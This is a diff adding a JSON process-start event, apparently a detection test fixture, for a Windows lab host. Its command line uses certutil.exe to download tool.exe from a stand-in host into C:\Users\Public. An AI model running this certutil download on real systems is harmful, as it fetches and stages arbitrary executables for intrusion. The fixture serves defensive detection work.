@@ -1,0 +1,24 @@
+{
+  "event": {
+    "category": [
+      "process"
+    ],
+    "type": [
+      "start"
+    ],
+    "kind": "event"
+  },
+  "host": {
+    "name": "ws-lab-07",
+    "os": {
+      "type": "windows"
+    }
+  },
+  "process": {
+    "name": "certutil.exe",
+    "command_line": "certutil.exe -urlcache -split -f http://example.invalid/tool.exe C:\\Users\\Public\\tool.exe",
+    "pe": {
+      "original_file_name": "CertUtil.exe"
+    }
+  }
+}
